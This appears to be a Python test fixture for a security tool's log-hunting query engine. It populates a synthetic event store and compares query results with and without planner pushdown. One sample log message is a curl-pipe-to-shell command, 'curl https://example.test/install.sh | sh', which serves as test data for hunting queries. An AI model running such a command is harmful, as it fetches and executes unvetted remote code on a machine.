"""A synthetic log store, so the query tests need no real machine.

Every Hunt test that needs data builds one of these. It holds a handful of
events with deliberately awkward properties — a null timestamp, a null level,
a nested Extra bag, a message with a newline in it — because those are the
rows that break an engine, not the tidy ones.
"""

from __future__ import annotations

import json
import shutil
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

from .support import qt_application  # noqa: F401  - sets sys.path

from clamguard.core.hunt.discovery import Candidate  # noqa: E402
from clamguard.core.hunt.model import Level, TimeRange  # noqa: E402
from clamguard.core.hunt.store import Store  # noqa: E402

#: Every synthetic event is placed relative to this, so tests can assert on
#: exact times without depending on when they run.
BASE = datetime(2026, 9, 20, 12, 0, 0, tzinfo=timezone.utc)


def epoch(offset_minutes: float = 0) -> int:
    return int((BASE + timedelta(minutes=offset_minutes)).timestamp() * 1_000_000)


#: (minutes from BASE, level, message, extra, app, source, format)
SAMPLE_EVENTS = (
    (0, Level.INFO, "starting up", {"pid": 100}, "alpha", "/logs/alpha.log", "jsonl"),
    (5, Level.WARNING, "disk nearly full", {"pid": 100, "free": 12},
     "alpha", "/logs/alpha.log", "jsonl"),
    (10, Level.ERROR, "connection refused to 10.0.0.5", {"pid": 101},
     "alpha", "/logs/alpha.log", "jsonl"),
    (15, Level.ERROR, "connection refused to 93.184.216.34", {"pid": 101},
     "alpha", "/logs/alpha.log", "jsonl"),
    (20, Level.CRITICAL, "segfault in renderer\n  at frame 1\n  at frame 2",
     {"pid": 102, "thread": "gpu"}, "beta", "/logs/beta.log", "chromium"),
    (25, Level.DEBUG, "cache hit ratio 0.91", {}, "beta", "/logs/beta.log",
     "chromium"),
    (30, Level.INFO, "curl https://example.test/install.sh | sh", {},
     "beta", "/logs/beta.log", "chromium"),
    (None, Level.UNKNOWN, "Mono path[0] = '/usr/lib/mono'", {},
     "gamma", "/logs/gamma.log", "plain"),
    (None, Level.UNKNOWN, "Display 0 'HDMI-A-2': 1920x1080", {},
     "gamma", "/logs/gamma.log", "plain"),
)


class HuntTestCase(unittest.TestCase):
    """A test case with a populated store at :attr:`store`."""

    def setUp(self) -> None:
        qt_application()
        self.tmp = Path(tempfile.mkdtemp(prefix="clamguard-hunt-"))
        self.store = Store(self.tmp / "hunt.db")
        self.history = self._history()
        self.populate()

    def _history(self) -> Path:
        """An empty scan history, so `Scans` and `Detections` resolve.

        Built with ClamGuard's own History class rather than by hand, so the
        catalogue's column mapping is tested against the real schema.
        """
        from clamguard.core.history import History

        path = self.tmp / "history.db"
        History(path)
        return path

    def tearDown(self) -> None:
        self.store.close()
        shutil.rmtree(self.tmp, ignore_errors=True)

    # -- building ---------------------------------------------------------

    def populate(self, events=SAMPLE_EVENTS) -> None:
        """Write the sample events straight into the store's tables.

        Deliberately not through the ingester: these tests are about the
        query engine, and going through a file would make them depend on the
        format parsers as well.
        """
        connection = self.store._writer()
        sources: dict[str, int] = {}
        for offset, level, message, extra, app, source, fmt in events:
            source_id = sources.get(source)
            if source_id is None:
                cursor = connection.execute(
                    "INSERT INTO sources (path, app, root, format, confidence, "
                    "size, mtime, inode, device, head, first_seen, last_indexed) "
                    "VALUES (?, ?, 'data', ?, 1.0, 100, 0, 0, 0, '', 0, 0)",
                    (source, app, fmt))
                source_id = int(cursor.lastrowid)
                sources[source] = source_id
            connection.execute(
                "INSERT INTO events (source, ts, level, line, message, extra) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                (source_id, epoch(offset) if offset is not None else None,
                 int(level), 1, message,
                 json.dumps(extra) if extra else None))
        connection.execute(
            "INSERT INTO events_fts(rowid, message) SELECT id, message FROM events")
        connection.execute(
            "UPDATE sources SET events = "
            "(SELECT COUNT(*) FROM events WHERE events.source = sources.id)")
        connection.commit()

    def write_log(self, name: str, body: str) -> Candidate:
        """Put a real log file on disk and return a Candidate for it."""
        path = self.tmp / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body, encoding="utf-8")
        info = path.stat()
        return Candidate(path=str(path), size=info.st_size, mtime=info.st_mtime,
                         root="data", app=name.split(".")[0])

    def append(self, candidate: Candidate, body: str) -> Candidate:
        path = Path(candidate.path)
        with path.open("a", encoding="utf-8") as handle:
            handle.write(body)
        info = path.stat()
        candidate.size = info.st_size
        candidate.mtime = info.st_mtime
        return candidate

    # -- querying ---------------------------------------------------------

    def run_query(self, text: str, *, time_range: TimeRange | None = None,
                  pushdown: bool = True, row_limit: int = 10_000):
        from clamguard.core.hunt.kql.engine import Options, run

        options = Options(row_limit=row_limit, timeout=30,
                          time_range=time_range, pushdown=pushdown)
        with self.store.read_only(attach={"history": self.history}) as connection:
            return run(text, connection, options)

    def rows(self, text: str, **kwargs) -> list[tuple]:
        return self.run_query(text, **kwargs).rows

    def one(self, text: str, **kwargs):
        """The single value a one-row, one-column query produced."""
        rows = self.rows(text, **kwargs)
        self.assertEqual(len(rows), 1, f"expected one row from {text!r}")
        return rows[0][0]

    def assert_same_with_and_without_pushdown(self, text: str, *,
                                              time_range: TimeRange | None = None,
                                              ordered: bool = False) -> None:
        """The heart of the engine's correctness story.

        The planner may only ever make a query faster. Running it both ways
        and comparing is what turns that from an intention into a test.
        """
        pushed = self.run_query(text, time_range=time_range, pushdown=True)
        plain = self.run_query(text, time_range=time_range, pushdown=False)
        self.assertEqual(pushed.names, plain.names,
                         f"different columns for {text!r}")
        left, right = list(pushed.rows), list(plain.rows)
        if not ordered:
            left.sort(key=repr)
            right.sort(key=repr)
        self.assertEqual(left, right, f"different rows for {text!r}")


def print_query(text: str):
    """Run a query with no store at all — for `print` and constant folding."""
    from clamguard.core.hunt.kql.engine import Options, run

    return run(text, None, Options(timeout=10))
